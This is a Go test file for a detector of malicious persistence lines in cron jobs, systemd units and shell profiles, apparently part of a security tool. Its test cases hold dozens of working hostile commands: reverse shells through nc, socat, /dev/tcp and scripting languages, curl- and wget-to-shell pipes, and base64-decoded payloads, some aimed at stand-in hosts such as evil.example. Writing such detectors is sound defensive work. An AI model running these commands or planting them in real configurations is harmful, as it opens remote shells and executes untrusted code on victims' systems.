package persistsig

import (
	"testing"

	"github.com/donaldsteele/telltale/internal/model"
)

func TestMatchLinePatterns(t *testing.T) {
	hits := []string{
		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		`exec 3<>/dev/udp/10.0.0.1/53`,
		`sh -i >& /dev/null 0>&1`,
		`/bin/bash -i 2>&1 | nc 10.0.0.1 4444`,
		`nc -e /bin/sh 10.0.0.1 4444`,
		`ncat --exec /bin/bash 10.0.0.1 4444`,
		`/usr/bin/netcat -lvp 4444 -c bash`,
		`NC.TRADITIONAL -e /bin/sh h 1`,
		`socat TCP:10.0.0.1:4444 EXEC:/bin/sh,pty,stderr`,
		`socat tcp-connect:h:1 system:'sh -i'`,
		`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f`,
		`curl -s http://x.example/a.sh | sh`,
		`curl -fsSL http://x.example/a.sh | sudo bash`,
		`wget -qO- http://x.example/a | /bin/bash -s`,
		`sh -c "$(curl -fsSL http://x.example/a)"`,
		"bash -c \"`wget -qO- http://x/a`\"",
		`bash <(curl -s http://x.example/a)`,
		`eval "$(curl -s http://x.example/a)"`,
		`echo cGF5bG9hZA== | base64 -d | sh`,
		`base64 --decode /tmp/p | bash`,
		`python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("h",1));subprocess.call(["/bin/sh"])'`,
		`python -c "import socket,os,pty;s=socket.socket();os.dup2(s.fileno(),0);pty.spawn('sh')"`,
		`perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);exec("/bin/sh -i")'`,
		`ruby -rsocket -e 'c=TCPSocket.new("h",1);exec "/bin/sh"'`,
		`php -r '$s=fsockopen("h",1);exec("/bin/sh -i <&3");'`,
		`* * * * * root curl -s http://x.example/a | sh`,
	}
	for _, l := range hits {
		if MatchLine(l) == "" {
			t.Errorf("no hit: %s", l)
		}
	}
	misses := []string{
		`curl -o /tmp/x https://example.com/file.tar.gz`,
		`wget -q https://example.com/list.txt -O /var/lib/list`,
		`nc -z host 22`,
		`nc -vz host 22`,
		`curl -s https://example.com/health | shasum -a 256`,
		`curl -s https://example.com/x | shuf -n1`,
		`bash -c 'echo hello'`,
		`sh -i`,
		`socat TCP-LISTEN:8080,fork TCP:localhost:80`,
		`echo cGF5 | base64 -d > /tmp/p`,
		`base64 /etc/hostname`,
		`python3 -c 'print(1)'`,
		`python3 /usr/lib/app/socket_check.py`,
		`python3 -c 'import socket; print(socket.gethostname())'`,
		`mkfifo /tmp/f`,
		``,
	}
	for _, l := range misses {
		if MatchLine(l) != "" {
			t.Errorf("false hit: %s", l)
		}
	}
}

func TestDetectQueryStringDoesNotHideShell(t *testing.T) {
	got := Detect(model.PersistKindCron, []string{"SHELL=/bin/sh", "* * * * * root curl http://evil.example/?a=1 | sh"})
	if len(got) != 1 || got[0].Line != 2 || got[0].Pattern != DownloadPipe {
		t.Errorf("got %+v", got)
	}
}

func TestDetectKindsLinesAndContinuations(t *testing.T) {
	if got := Detect(model.PersistKindHosts, []string{"nc -e /bin/sh h 1"}); got != nil {
		t.Errorf("hosts file scanned: %v", got)
	}
	if got := Detect(model.PersistKindCron, []string{"# nc -e /bin/sh h 1"}); got != nil {
		t.Errorf("comment: %v", got)
	}
	unit := []string{"Description=nc -e /bin/sh h 1", "ExecStart=/bin/bash -c 'exec 3<>\\", "/dev/tcp/h/1'"}
	if got := Detect(model.PersistKindSystemdUnit, unit); len(got) != 1 || got[0].Line != 2 {
		t.Errorf("unit: %v", got)
	}
	got := Detect(model.PersistKindCron, []string{"* * * * * root curl -s http://x/a \\", "  | sh"})
	if len(got) != 1 || got[0].Line != 1 {
		t.Errorf("continuation: %v", got)
	}
	if got := Detect(model.PersistKindProfile, []string{"# note \\", "echo | sh"}); got != nil {
		t.Errorf("comment continuation: %v", got)
	}
}

func TestMatchLineFixRound1(t *testing.T) {
	hits := []string{
		`sh -c 'nc -e /bin/sh h p'`,
		`bash -c "nc h p -e /bin/bash"`,
		`/bin/sh -c "nc -e /bin/sh h p"`,
		`FOO=nc -e /bin/sh h p`,
		`T=/dev/tcp; exec 3<>$T/h/p`,
		`curl -o /tmp/f http://h/x; sh /tmp/f`,
		`wget -q -O /tmp/.k http://h/x; chmod 777 /tmp/.k; /tmp/.k`,
		`cd /tmp && wget http://h/x -O x.sh && sh x.sh`,
		`curl -s http://h/x > /tmp/y && bash /tmp/y`,
		`curl --output /tmp/z http://h/x && chmod +x /tmp/z && /tmp/z`,
		`wget -qO /tmp/s http://h/x ; . /tmp/s`,
		`curl -fsSL http://h/x | busybox sh`,
		`sh -c 'wget -O /tmp/x http://h/x && sh /tmp/x'`,
		`curl -fsSL http://h/x | env bash`,
		`curl -fsSL http://h/x | tee /tmp/x | sh`,
	}
	for _, l := range hits {
		if MatchLine(l) == "" {
			t.Errorf("no hit: %s", l)
		}
	}
	misses := []string{
		`nc -z db 5432 && tar -czf /backup/x.tgz /srv`,
		`nc -l -p 9000 | gzip -c > /backup/in.gz`,
		`nc -l -p 9000 | wc -c`,
		`printf 'QUIT' | nc -C mail.example 25`,
		`curl -o /tmp/x https://example.com/file.tgz`,
		`curl -o /tmp/x https://example.com/file.tgz && tar xf /tmp/x`,
		`wget -q -O /tmp/x http://h/x; sha256sum -c /tmp/x`,
		`curl -fsSL http://h/x | shasum`,
		`curl -o /tmp/x http://h/x && echo done`,
	}
	for _, l := range misses {
		if id := MatchLine(l); id != "" {
			t.Errorf("false hit %s: %s", id, l)
		}
	}
	// spaces around "=" in a unit, and the extra Exec keys
	for _, l := range []string{
		"ExecStart = /bin/bash -c 'exec 3<>/dev/tcp/h/1'",
		"ExecStopPre= /bin/bash -c 'exec 3<>/dev/tcp/h/1'",
		"ExecCondition =/bin/bash -c 'exec 3<>/dev/tcp/h/1'",
	} {
		if got := Detect(model.PersistKindSystemdUnit, []string{l}); len(got) != 1 {
			t.Errorf("unit line missed: %s", l)
		}
	}
}

func TestMatchLineFixRound2(t *testing.T) {
	hits := []string{
		`nc 1.2.3.4 4444 2>&1 -e /bin/sh`,
		`nc 1.2.3.4 4444 0<&1 -e /bin/sh`,
		`nc 1.2.3.4 4444 >&2 -e /bin/sh`,
		`nc 1.2.3.4 4444 &>/dev/null -e /bin/sh`,
		`nc -e /bin/sh 1.2.3.4 4444 >/dev/null 2>&1`,
		`nc 1.2.3.4 4444 -e/bin/sh`,
		`ncat --exec=/bin/sh 1.2.3.4 4444`,
		`ncat --sh-exec=/bin/sh 1.2.3.4 4444`,
		`NC -e /bin/sh h p`,
		`busybox nc h p -e sh`,
		`ncat -e /bin/sh --ssl h p`,
		`nc -lnvp 4444 -c /bin/sh`,
		`nc h p -e "/bin/sh"`,
		`(nc h p -e /bin/sh &)`,
		`nohup nc h p -e /bin/sh &`,
		`x=1 nc h p -e /bin/sh`,
		`exec nc h p -c sh`,
	}
	for _, l := range hits {
		if MatchLine(l) == "" {
			t.Errorf("no hit: %s", l)
		}
	}
	misses := []string{
		`ProxyCommand nc -X connect -x proxy:8080 %h %p`,
		`nc -q 1 -w 5 host 25 < /tmp/mail-cmd`,
		`echo ok | nc -N host 9 ; echo -e done`,
		`nc -z h 1 || echo -e "down"`,
		`nc -w3 h 80 < req > resp; gzip -c resp > r.gz`,
		`nc host 25 -C`,
		`/usr/bin/nc.openbsd -zv h 22 -w 1`,
		`printf x | nc h p | tee -a /var/log/x | grep -c ok`,
		`nc -z db 5432 && tar -czf /backup/x.tgz /srv`,
	}
	for _, l := range misses {
		if id := MatchLine(l); id != "" {
			t.Errorf("false hit %s: %s", id, l)
		}
	}
	// systemd command prefixes
	for _, l := range []string{"ExecStart=-nc -e /bin/sh h p", "ExecStart=@/usr/bin/nc nc -e /bin/sh h p", "ExecStart=!!nc -e /bin/sh h p", "ExecStart=+nc -e /bin/sh h p", "ExecStart=:nc -e /bin/sh h p"} {
		if got := Detect(model.PersistKindSystemdUnit, []string{l}); len(got) != 1 {
			t.Errorf("unit line missed: %s", l)
		}
	}
}
